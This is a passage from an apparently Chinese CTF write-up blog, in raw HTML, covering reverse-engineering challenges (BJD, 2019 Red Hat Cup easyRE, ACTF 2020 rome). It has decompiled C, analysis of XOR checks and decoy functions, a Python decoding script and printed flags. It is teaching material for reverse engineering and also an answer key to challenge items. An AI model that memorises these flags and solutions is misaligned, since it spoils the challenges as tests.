class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">EndDialog</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据下面的得到flag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">" BJD&#123;%d%d2069a45792d233ac&#125;"</span><span class="token punctuation">,</span> <span class="token number">19999</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">BJD&#123;1999902069a45792d233ac&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h3><p>提示了是elf文件，直接ida64打开之后一路跟踪到关键代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_4009C6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-114h]</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-108h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-100h]</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-F8h]</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-F0h]</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-E8h]</span>  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-E0h]</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-D8h]</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-D0h]</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-C8h]</span>  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-C0h] BYREF</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+6Dh] [rbp-B3h] BYREF</span>  <span class="token keyword">char</span> v14<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+71h] [rbp-AFh] BYREF</span>  <span class="token keyword">char</span> v15<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-90h] BYREF</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-70h]</span>  <span class="token keyword">char</span> v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+B4h] [rbp-6Ch]</span>  <span class="token keyword">char</span> v18<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+C0h] [rbp-60h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+108h] [rbp-18h]</span>  v19 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Iodl>Qnb(ocy"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token string">"y.i"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v13<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v14<span class="token punctuation">,</span> <span class="token string">"d`3w&#125;wek9&#123;iy=~yL@EC"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v15<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v15<span class="token punctuation">,</span> <span class="token number">37LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">36</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v15<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>v15<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> v12<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> <span class="token number">4294967294LL</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"continue!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v18<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">sub_4406E0</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v18<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v18<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_424BA0</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">39</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v2 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>      v5 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      v7 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>      v8 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v9 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token function">sub_400E44</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400360</span><span class="token punctuation">(</span>v11<span class="token punctuation">,</span> off_6CC090<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"You found me!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sub_410CC0</span><span class="token punctuation">(</span><span class="token string">"bye bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> <span class="token number">4294967293LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>LABEL_13<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v19 <span class="token punctuation">)</span>    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数似乎是个坑，本来我是不太会的，看了wp，原来是下面的这里的内容进行了10次base64解密会获得一个看雪某版主的一篇文章，而那篇文章对解这道题是无用的</p><p><img src="/2021/05/28/CTF/image-20210531125151809.png" alt="image-20210531125151809"></p><p>然后继续向下看，发现字符串<code>byte_6CC0A0</code>，点进去函数，发现这个才是真正的可以获得flag的函数</p><p><img src="/2021/05/28/CTF/image-20210531130338935.png" alt="image-20210531130338935"></p><p>发现该函数对应的反编译出的c语言的代码如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_400D35</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_43FD20</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> qword_6CEE38<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">24</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>      <span class="token function">sub_410E90</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token punctuation">(</span>byte_6CC0A0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> j <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  result <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token punctuation">)</span>    <span class="token function">sub_444020</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这个异或实际上不起任何作用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">1233</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40F790</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_40FE60</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x98765432</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v4 <span class="token operator">=</span> v1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>异或偶数次还是异或前的内容，所以只需要对于v4，只满足</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v1 <span class="token operator">^</span> byte_6CC0A0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f'</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">HIBYTE</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>byte_6CC0A3<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'g'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与<code>6CC0A0</code>的前四位字符异或后等于<code>flag</code>即可，这里直接写脚本爆破v4与flag</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">l1 <span class="token operator">=</span> <span class="token string">'@5 V]'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"E'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/$nb&lt;'</span> <span class="token operator">+</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'THl$nr&lt;2E['</span>f1 <span class="token operator">=</span> <span class="token string">'flag'</span>key <span class="token operator">=</span> <span class="token string">''</span>f2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">:</span>    key <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>f1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token operator">:</span>    f2 <span class="token operator">+=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>l1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">flag</span><span class="token expression"><span class="token punctuation">&#123;</span>Act1ve_Defen5e_Test<span class="token punctuation">&#125;</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ACTF新生赛2020-rome"><a href="#ACTF新生赛2020-rome" class="headerlink" title="[ACTF新生赛2020]rome"></a>[ACTF新生赛2020]rome</h3><p>查字符串找到主要函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-44h]</span>  <span class="token keyword">unsigned</span> __int8 v2<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-34h] BYREF</span>  <span class="token keyword">unsigned</span> __int8 v3<span class="token punctuation">;</span> <span class="token comment">// [esp+25h] [ebp-33h]</span>  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-32h]</span>  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment">// [esp+27h] [ebp-31h]</span>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-30h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+29h] [ebp-2Fh]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+2Dh] [ebp-2Bh]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+31h] [ebp-27h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+35h] [ebp-23h]</span>  <span class="token keyword">unsigned</span> __int8 v11<span class="token punctuation">;</span> <span class="token comment">// [esp+39h] [ebp-1Fh]</span>  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-1Dh] BYREF</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Qsw3sj_lz4_Ujw@l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token string">'A'</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> v3<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token string">'C'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      result <span class="token operator">=</span> v4<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token string">'T'</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> v5<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token string">'F'</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          result <span class="token operator">=</span> v6<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token string">'&#123;'</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            result <span class="token operator">=</span> v11<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">==</span> <span class="token string">'&#125;'</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>              v1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token 